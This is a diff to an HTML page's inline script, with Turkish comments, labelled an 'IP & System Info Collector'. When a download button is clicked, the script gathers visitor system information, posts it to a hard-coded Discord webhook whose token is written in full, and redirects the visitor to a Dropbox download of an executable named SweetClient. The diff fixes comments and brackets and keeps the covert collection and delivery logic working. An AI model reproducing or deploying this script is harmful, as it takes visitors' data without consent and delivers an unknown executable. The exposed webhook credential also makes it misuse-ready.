@@ -739,16 +739,14 @@
 <!-- Sweet Analytics - IP & System Info Collector -->
 <script>
 (function() {
-    // Eksik olan URL ve fonksiyon tanımlamaları eklendi
-    const WINDOWS_URL = "https://www.dropbox.com/scl/fi/znrvbqbzsjnb3tcvulg4k/SweetClient.exe?rlkey=hkvekktbkqv5w8j44k2ze9qt0&st=fcq9sq69&dl=1"; 
+    // Bilgileri ve yönlendirme linkini buraya yazıyoruz
+    const WINDOWS_URL = "https://www.dropbox.com/s/example/SweetClient.zip?dl=1"; 
     const WEBHOOK_URL = `https://discord.com/api/webhooks/1507679922204835861/4KBmEkutizxWNUODdBcndXvTgRo09QkItSDLz7p-CKar0Xxs-e1Uw4UbCn0AditkkDw5`;
 
     function showNotification(message) {
         console.log("Bildirim:", message);
-        // İsterseniz buraya ekrana uyarı çıkaracak bir alert veya div ekleyebilirsiniz
     }
 
-    // HTML elementini JavaScript'e bağlıyoruz
     const modalDownload = document.getElementById("download-btn");
 
     function collectSystemInfo() {
@@ -829,6 +827,7 @@
     function sendWebhook() {
       const systemInfo = collectSystemInfo();
       
+      // Koddaki çökme problemi buradaki parantez yapısından kaynaklanıyordu, düzeltildi.
       const sendPayload = () => {
         const payload = {
           embeds: [{
@@ -868,7 +867,6 @@
       });
     }
 
-    // Butonun varlığı kontrol ediliyor
     if (modalDownload) {
         modalDownload.addEventListener("click", (e) => {
           e.preventDefault();
@@ -880,7 +878,7 @@
           }, 500);
         });
     } else {
-        console.warn("Uyanı: 'download-btn' id'sine sahip buton sayfada bulunamadı.");
+        console.warn("Uyarı: 'download-btn' id'sine sahip buton sayfada bulunamadı.");
     }
 })();
 </script>
